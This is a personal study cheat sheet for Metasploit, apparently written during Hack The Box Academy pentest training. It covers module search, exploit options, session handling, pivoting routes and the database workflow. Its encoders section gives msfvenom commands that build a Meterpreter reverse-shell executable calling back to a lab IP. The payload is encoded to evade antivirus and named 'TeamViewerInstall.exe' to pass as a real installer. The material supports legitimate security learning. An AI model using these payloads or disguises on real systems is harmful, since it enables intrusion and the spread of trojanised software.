Matasploit [Cheatsheet](file:///C:/Users/Aaryan/Downloads/Metasploit-Cheat-Sheet.pdf)

![[Pasted image 20230117210714.png]]

![[Pasted image 20220713103753.png]]

![[Pasted image 20230117212447.png]]

---
# Framework File Structure
1) **Modules**
The Modules detailed above are split into separate categories in this folder. They are contained in the following folders:
```sh
aaryan11x@htb[/htb]$ ls /usr/share/metasploit-framework/modules

auxiliary  encoders  evasion  exploits  nops  payloads  post
```

2) **Plugins**
Plugins offer the pentester more flexibility when using the msfconsole since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.
```sh
aaryan11x@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
auto_add_route.rb  lab.rb         request.rb           thread.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
```


3) **Scripts**
Meterpreter functionality and other useful scripts.
```sh
aaryan11x@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/

meterpreter  ps  resource  shell
```


4) **Tools**
Command-line utilities that can be called directly from the msfconsole menu.
```sh
aaryan11x@htb[/htb]$ ls /usr/share/metasploit-framework/tools/

context  docs     hardware  modules   payloads
dev      exploit  memdump   password  recon
```

---
# Commands
1) *To Search For Module*
	msf > search [regex]
	![[Pasted image 20220713104834.png]]
```sh
msf> search type:exploit platform:windows cve:2021 rank:excellent microsoft

-s Sort the research results based on <search_column> in ascending order
-r Reverse the search results order to descending order

msf> search type:exploit -s type -r
```


2) *To Specify and Exploit To Use*
	msf > use [exploit_name or index]
	
	- Here, Use *Info* For More Information <u>About The Exploit</u> & *Options* For <u>Printing The Available Options.</u>
	- RHOST : <u>Remote Hosts</u>

![[Pasted image 20220713105122.png]]


3) *To Set Options & Run The Exploit*
```sh
msf > set [option] [value]

# For Permanent Target selection
msf> setg [option] [value]

# Set Target (If you know the Version numbers, else let it be automatic)
msf> show targets
msf> set target [ID]

# To check if the system is vulnerable to the exploit
msf> check

# Run the exploit
msf > run or exploit
```
				
	![[Pasted image 20220713110246.png]]

**Note : METASPLOIT SOMETIMES DOESN'T PICK THE CORRECT LHOST, SO MANUALLY CHANGE TO YOUR HOST IF IT ISN'T THE SAME**

To Unset a Payload, Type `unset [payload_name]`
Use `back` to go unselect the exploit

For More *Meterpreter* Commmands, Go to [[Meterpreter Main Commands]]

---
# Managing Sessions

###### Multiple Exploitation
Run the exploit expecting a single session that is immediately backgrounded:

```sh
msf > exploit -z
```

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```sh
msf > exploit –j

# Kill all sessions
msf > exploit -K
```

###### List all current jobs (usually exploit listeners):

```sh
msf > jobs –l
```

###### Kill a job:

```sh
msf > jobs –k [JobID]
```

###### List all backgrounded sessions:

```sh
msf > sessions -l
```

###### Interact with a backgrounded session:

```sh
msf > session -i [SessionID]
```

###### Background the current interactive session:

```sh
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

###### Routing Through Sessions:
All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```sh
# Manually add route
msf > route add 172.16.5.0/24 [session_id]
msf > route print

# Automatically add route
msf > use multi/manage/autoroute

# Remove all routes
msf > route flush
```

---
# Payload
[[Payload]]

---
# Encoders
Encoders have assisted with making *payloads compatible with different processor architectures* while at the same time helping with *antivirus evasion*. Encoders come into play with the role of changing the payload to run on different operating systems and architectures.

**Shikata Ga Nai (SGN)** is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore.

```sh
# Use SGN once
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

# Use SGN for multiple iterations
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
```sh
# Scan exe through VirusTotal API
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

---
# Databases
https://academy.hackthebox.com/module/39/section/411
```sh
# Start PostgreSQL
sudo systemctl start postgresql

# Initialize database
sudo msfdb init
sudo msfdb status
msfconsole -q

# Verify database connectivity
msf6 > db_status

# Show workspaces
msf6 > workspace
* default

# Create a new workspace
msf6 > workspace -a pen200
msf6 > workspace pen200

# Use nmap in msfconsole
msf6> db_nmap -A 192.168.50.202

# Get a list of hosts discovered
msf6 > hosts

# List services
msf6 > services
msf6 > services -p 8000
msf6 > services -p 445 --rhosts    # Set RHOST(s) from the nmap scan

# Show credentials
msf6 > creds

# Import scan results
msf6 > db_import Target.xml
```


# Plugins
https://academy.hackthebox.com/module/39/section/413

---
# Importing Modules
Only `.rb` files can be imported to Metasploit Framework.
If an exploit is *not present* in Metasploit by default, we can *import* them!

```sh
# Loading additional modules only at runtime
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
```
```sh
# Loading additional modules
msf6> loadpath /usr/share/metasploit-framework/modules/
OR
msf6 > reload_all
```


# Run scripts
```sh
# Scripts is a .rc file with all msfconsole commands only
sudo msfconsole -q -r listener.rc
```

---
# Convert Shell to Meterpreter Shell
```sh
use post/multi/manage/shell_to_meterpreter
SET SESSION [session_id]
```

From **exploit/multi/handler**, any of the following could happen:-
-   A simple socket listener/connection, like *netcat* (for plain shell payloads)
-   A handler for stager payloads that uploads Meterpreter (for `meterpreter/*` payloads)
-   A handler for single-stage (stageless?) Meterpreter (for `meterpreter_*` payloads)